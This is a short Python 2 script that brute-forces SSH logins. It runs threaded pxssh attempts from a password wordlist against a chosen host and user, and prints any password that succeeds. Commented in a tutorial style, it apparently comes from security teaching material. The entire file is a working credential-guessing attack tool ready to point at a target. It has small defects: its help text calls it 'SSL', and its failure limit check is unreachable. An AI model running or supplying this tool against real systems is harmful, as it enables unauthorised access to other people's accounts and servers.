import pexpect, argparse, time, pxssh
from threading import *

# In thise case we're using Bounded semaphores so we can limit how many are created 
# at one point as indicated by the variable max connections
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
	global Found
	global Fails

	# This is where it actually checks to see if the password worked
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: %s' % str(password)
		Found = True

	# Any error and it comes here
	except Exception, e:

		#First check to see if there are too many semaphores
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)

		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)

	finally:
		if release:
			connection_lock.release()

def main():	

	# argparse takes care of all the arguments we add to the command line
	parser = argparse.ArgumentParser(description="An SSL bruteforcing program")
	parser.add_argument('-H', type=str, help='specify target host')
	parser.add_argument('-F', type=str, help='specify password file')
	parser.add_argument('-u', type=str, help='specify the user')

	# This is where we parse them and divvy them out
	args = parser.parse_args()

	host = args.H
	passwdFile = args.F
	user = args.u

	# I wish this was native and argparse had an easier way to take care of this
	if host == None or passwdFile == None or user == None:
		print parser.print_help()
		exit(0)

	# Open the password file read only and we start reading it
	fn = open(passwdFile, 'r')

	for line in fn.readlines():

		# Checks the global found variable each time
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)

			# Haven't ran into this problem but just in case 
			# the socket has some sort of limiter on it
			if Fails > 5:
				print "[!] Exiting: Too Many Socket Timeouts"
				exit(0)
		else:
			
			connection_lock.acquire()
			password = line.strip('\r').strip('\n')

			print "[-] Testing: " + str(password)

			# We open up a thread and test the password
			t = Thread(target=connect, args=(host, user, password, True))
			child = t.start()

if __name__ == '__main__':
	main()
